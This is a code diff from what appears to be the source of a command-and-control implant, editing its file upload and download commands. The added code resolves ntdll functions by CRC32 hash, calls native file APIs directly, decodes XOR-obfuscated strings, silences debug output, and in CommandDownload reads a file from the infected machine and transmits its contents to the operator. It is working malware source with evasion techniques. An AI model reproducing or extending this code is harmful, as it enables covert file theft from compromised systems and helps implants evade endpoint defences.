@@ -223,19 +223,21 @@ VOID CommandUpload( PPARSER Parser ) {
     FileName[NameSize] = 0;
 
     // FIX THIS STRING
-    _tprintf("FileName => %s (FileSize: %d)\n", FileName, FileSize);
+    //_tprintf("FileName => %s (FileSize: %d)\n", FileName, FileSize);
 
     NTSTATUS status;
     UNICODE_STRING file_path;
-    char *file_name = FileName;
+    char file_name[MAX_PATH] = { 0 };
+    memcpy(file_name,FileName, NameSize - 1);
+    //NameSize = strlen(file_name);
 
     // FIX THIS STRING
-    _tprintf("Before: %s\n", file_name);
+    // _tprintf("Before: %s\n", file_name);
 
     normalize_path(file_name);
 
     // FIX THIS STRING
-    _tprintf("Normalized: %s\n", file_name);
+    // _tprintf("Normalized: %s\n", file_name);
 
     WCHAR *w_file_path = str_to_wide(file_name);
     void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32B);
@@ -243,6 +245,8 @@ VOID CommandUpload( PPARSER Parser ) {
     g_rtl_init_unicode_string(&file_path, w_file_path);
     OBJECT_ATTRIBUTES obj_attrs;
     IO_STATUS_BLOCK io_status_block;
+
+
     InitializeObjectAttributes(&obj_attrs, &file_path, 0x00000040L, NULL, NULL);
     void *p_nt_create_file = get_proc_address_by_hash(p_ntdll, NtCreateFile_CRC32B);
     NtCreateFile_t g_nt_create_file = (NtCreateFile_t) p_nt_create_file;
@@ -250,14 +254,14 @@ VOID CommandUpload( PPARSER Parser ) {
                                    FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF,
                                    FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL,
                                    0)) != 0x0) {
-        _tprintf("[*] NtCreateFile: Failed[0x%lx]\n", status);
+        //_tprintf("[*] NtCreateFile: Failed[0x%lx]\n", status);
         goto Cleanup;
     }
 
     void *p_nt_write_file = get_proc_address_by_hash(p_ntdll, NtWriteFile_CRC32B);
     NtWriteFile_t g_nt_write_file = (NtWriteFile_t) p_nt_write_file;
     if ((status = g_nt_write_file(hFile, NULL, NULL, NULL, &io_status_block, Content, FileSize, 0, 0)) != 0x0) {
-        _tprintf("[*] NtWriteFile: Failed[0x%lx]\n", status);
+        //_tprintf("[*] NtWriteFile: Failed[0x%lx]\n", status);
         goto Cleanup;
     }
 
@@ -358,15 +362,98 @@ VOID CommandUpload_bak( PPARSER Parser ) {
 
 
 VOID CommandDownload( PPARSER Parser ) {
+#if CONFIG_ARCH == x64
+    void *p_ntdll = get_ntdll_64();
+#else
+    void *p_ntdll = get_ntdll_32();
+#endif //CONFIG_ARCH
 
 //--------------------------------
 #if CONFIG_OBFUSCATION
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_COMMAND_DOWNLOAD;
     _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
+
+    PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
+    DWORD    FileSize = 0;
+    DWORD    Read     = 0;
+    DWORD    NameSize = 0;
+    PCHAR    FileName = ParserGetBytes(Parser, (PUINT32) &NameSize);
+    HANDLE   hFile    = NULL;
+    PVOID    Content  = NULL;
+
+    FileName[ NameSize ] = 0;
+    //PCHAR FileName = "C:/Temp/test.txt\0";
+    /*NameSize  = strlen(FileName);
+    _tprintf( "FileName => %s\n", FileName );
+    _tprintf("Old NameSize => %d\n", NameSize);
+    _tprintf("Strlen of FileName =>%d\n", strlen(FileName));
+     */
+    NTSTATUS status;
+    UNICODE_STRING file_path;
+    char file_name[MAX_PATH] = { 0 };
+    memcpy(file_name,FileName, NameSize - 2);
+    NameSize = strlen(file_name);
+
+    // FIX THIS STRING
+    // _tprintf("Before: %s\n", file_name);
+
+    normalize_path(file_name);
+
+    // FIX THIS STRING
+    // _tprintf("Normalized: %s\n", file_name);
+
+
+    WCHAR *w_file_path = str_to_wide(file_name);
+    void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32B);
+    RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;
+    g_rtl_init_unicode_string(&file_path, w_file_path);
+    OBJECT_ATTRIBUTES obj_attrs;
+    IO_STATUS_BLOCK io_status_block;
+
+    InitializeObjectAttributes(&obj_attrs, &file_path, 0x00000040L, NULL, NULL);
+
+
+    void *p_nt_open_file = get_proc_address_by_hash(p_ntdll, NtOpenFile_CRC32B);
+    NtOpenFile_t g_nt_open_file = (NtOpenFile_t) p_nt_open_file;
+    if((status = g_nt_open_file(&hFile, FILE_GENERIC_READ, &obj_attrs, &io_status_block, FILE_SHARE_READ, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT)) != 0){
+        //_tprintf("NtOpenFile: 0x%lx\n", status);
+        goto CleanupDownload;
+    }
+
+    FILE_STANDARD_INFORMATION file_standard_info;
+    void *p_nt_query_information_file = get_proc_address_by_hash(p_ntdll, NtQueryInformationFile_CRC32B);
+    NtQueryInformationFile_t g_nt_query_information_file = (NtQueryInformationFile_t) p_nt_query_information_file;
+    if((status = g_nt_query_information_file(hFile, &io_status_block, &file_standard_info, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation)) != 0x0) {
+        //S_tprintf("NtQueryInformationFile failed with status: 0x%lx\n", status);
+        goto CleanupDownload;
+    }
+
+    FileSize = file_standard_info.EndOfFile.QuadPart;
+    // _tprintf("file_size: %d\n", FileSize);
+    Content  = LocalAlloc( LPTR, FileSize );
+
+    void *p_nt_read_file = get_proc_address_by_hash(p_ntdll, NtReadFile_CRC32B);
+    NtReadFile_t g_nt_read_file = (NtReadFile_t) p_nt_read_file;
+    if((status = g_nt_read_file(hFile, NULL, NULL, NULL, &io_status_block, Content, FileSize, NULL, NULL)) != 0x0) {
+        printf("NtReadFile failed with status: 0x%lx\n", status);
+        goto CleanupDownload;
+    }
+
+    Read += io_status_block.Information;
+
+    //Read = io_status_block.Information;
+    PackageAddBytes( Package, FileName, NameSize);
+    PackageAddBytes( Package, Content,  FileSize );
+
+    PackageTransmit( Package, NULL, NULL );
+
+
+
+
 #else
     _tprintf("Command::Download\n");
-#endif
+
 //--------------------------------
 
     PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
@@ -401,6 +488,7 @@ VOID CommandDownload( PPARSER Parser ) {
     PackageAddBytes( Package, Content,  FileSize );
 
     PackageTransmit( Package, NULL, NULL );
+#endif
 
     CleanupDownload:
     if ( hFile ){
@@ -413,6 +501,8 @@ VOID CommandDownload( PPARSER Parser ) {
         LocalFree( Content );
         Content = NULL;
     }
+
+
 }
 
 VOID CommandExit( PPARSER Parser ) {
